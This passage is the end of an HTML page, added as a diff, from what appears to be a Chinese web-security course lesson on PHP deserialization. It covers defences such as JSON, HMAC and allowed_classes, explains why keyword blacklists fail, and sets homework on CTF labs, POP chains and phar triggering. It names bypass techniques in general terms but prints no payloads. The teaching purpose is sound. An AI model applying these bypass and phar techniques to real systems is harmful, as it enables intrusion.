+        <thead><tr><th style="width:11rem">措施</th><th>说明</th></tr></thead>
+        <tbody>
+          <tr>
+            <td><strong>换成 JSON</strong></td>
+            <td>
+              最彻底。传输数据用 <code>json_encode</code> / <code>json_decode</code>，
+              JSON 里没有"类型"，不可能还原出对象，也就没有魔术方法可触发。
+            </td>
+          </tr>
+          <tr>
+            <td><strong>签名 / HMAC</strong></td>
+            <td>
+              如果非要用序列化，就给数据加个签名。服务端先验签，
+              不通过就拒绝 —— 这样用户改不了一个字节。
+            </td>
+          </tr>
+          <tr>
+            <td><strong>限制可反序列化的类</strong></td>
+            <td>
+              PHP 7 以后 <code>unserialize()</code> 的第二个参数可以白名单：
+              <pre><code>unserialize($data, ['allowed_classes' =&gt; ['MyClass']]);</code></pre>
+              只允许还原你需要的那个类，别的类一律变成 <code>__PHP_Incomplete_Class</code>，
+              魔术方法不会被调用。
+            </td>
+          </tr>
+          <tr>
+            <td><strong>升级版本</strong></td>
+            <td>
+              PHP 8.0 之后 phar 的自动解析收紧了，wakeup 那个老漏洞也早修了。
+              但 fast_destruct 这类逻辑问题还在，不能只靠升级。
+            </td>
+          </tr>
+        </tbody>
+      </table>
+
+      <div class="note pit">
+        <span class="note-tag">为什么"过滤关键词"不顶用</span>
+        <p>
+          你可能想过滤 <code>O:</code>、过滤 <code>system</code>、过滤 <code>__destruct</code>。
+          但上面第七节已经演示了三种绕法（加号、数组嵌套、大写 S），
+          再加上字符串逃逸，黑名单几乎必然被绕。
+        </p>
+        <p><strong>这类漏洞的正确解法永远是"别让数据进反序列化"，不是"把数据洗干净"。</strong></p>
+      </div>
+
+
+      <h2 id="s-homework">作业</h2>
+
+      <p>勾上就会记在本机，下次打开还在。</p>
+
+      <ul class="checkable">
+        <li>
+          <input type="checkbox" id="hw1" data-k="ser-lab">
+          <label for="hw1"><strong>打通反序列化靶场三关。</strong>
+          基础改属性、两层 POP 链、字符串逃逸。
+          建议全程写脚本生成 payload，别手写。</label>
+        </li>
+        <li>
+          <input type="checkbox" id="hw2" data-k="ctfshow">
+          <label for="hw2"><strong>ctfshow WEB 257-271，每种题型至少一道，共 4 道。</strong>
+          覆盖 POP 链基础、字符串逃逸、phar 与 Session 反序列化。</label>
+        </li>
+        <li>
+          <input type="checkbox" id="hw3" data-k="payload">
+          <label for="hw3"><strong>自己写几个 magic 方法，跑一遍看触发顺序。</strong>
+          重点观察：<code>__wakeup</code> 和 <code>__destruct</code> 谁先谁后；
+          接不接 <code>unserialize</code> 的返回值，<code>__destruct</code> 的执行时机有没有变。</label>
+        </li>
+        <li>
+          <input type="checkbox" id="hw4" data-k="phar">
+          <label for="hw4"><strong>（选做）生成一个 phar，并让它被 <code>file_get_contents</code> 触发。</strong>
+          注意 <code>phar.readonly</code> 要关掉。PHP 8 以上要改成调 <code>getMetadata()</code>。</label>
+        </li>
+      </ul>
+
+      <div class="note">
+        <span class="note-tag">这一讲的分量</span>
+        <p>
+          反序列化是 Web 安全里"读懂代码"要求最高的一类题。
+          前面几讲你可能靠猜、靠试就能过，这一讲不行 ——
+          <strong>你必须真的看懂类之间的关系。</strong>
+        </p>
+        <p>
+          但它也是最保值的：Java 那边的反序列化是同一个思路，
+          只是语法换了个样子。这一讲打通了，Java 那道坎会矮一半。
+        </p>
+      </div>
+
+      <div class="note">
+        <span class="note-tag">下一讲</span>
+        <p>
+          大概率是 <strong>RCE / 命令执行</strong>，或者 <strong>SSRF</strong>。
+          前者会用到这一讲的 <code>__destruct</code> 和 <code>system</code>，
+          后者常和 phar、gopher 协议配合。
+        </p>
+      </div>
+
+
+    </div>
+
+    <section class="teahouse" id="teahouse">
+      <div class="teahouse-head">
+        <h2>茶寮</h2>
+        <span class="sub">卡住的地方、踩过的坑，留个话，别人也看得到</span>
+      </div>
+      <div id="comments-mount"></div>
+    </section>
+
+  </article>
+
+  <aside class="side">
+    <div class="side-block">
+      <h4>本卷目录</h4>
+      <ul class="side-toc">
+        <li><a href="#s-intro">这一讲在讲什么</a></li>
+        <li><a href="#s-class">一 · 类和对象</a></li>
+        <li><a href="#s-serialize">二 · 序列化格式</a></li>
+        <li><a href="#s-magic">三 · 魔术方法</a></li>
+        <li><a href="#s-pop">四 · POP 链</a></li>
+        <li><a href="#s-phar">五 · phar 隐性触发</a></li>
+        <li><a href="#s-wakeup">六 · 绕过 wakeup</a></li>
+        <li><a href="#s-bypass">七 · 其他绕过</a></li>
+        <li><a href="#s-defend">八 · 防御</a></li>
+        <li><a href="#s-homework">九 · 作业</a></li>
+      </ul>
+    </div>
+
+    <div class="side-block">
+      <h4>读了几成</h4>
+      <div class="progress-ring" data-progress-ring>
+        <svg width="42" height="42" viewBox="0 0 36 36" aria-hidden="true">
+          <circle class="ring-bg" cx="18" cy="18" r="15.5" fill="none" stroke-width="2"></circle>
+          <circle class="ring-fg" cx="18" cy="18" r="15.5" fill="none" stroke-width="2"
+                  stroke-linecap="round" transform="rotate(-90 18 18)"
+                  style="stroke-dasharray:97.39;stroke-dashoffset:97.39"></circle>
+        </svg>
+        <span class="num"><b data-progress-num>0/0</b>作业打了勾</span>
+      </div>
+    </div>
+  </aside>
+
+</main>
+
+<footer class="site-foot">
+  <p class="colophon">竹隐 &middot; 其五 &middot; PHP 反序列化</p>
+  <p class="colophon">所有实操请在自己机器或授权范围内进行。</p>
+</footer>
+
+<button class="to-top" type="button" aria-label="回到卷首">&uarr;</button>
+
+<script src="../assets/js/site-config.js"></script>
+<script src="../assets/js/comments.js"></script>
+<script src="../assets/js/site.js"></script>
+</body>
+</html>
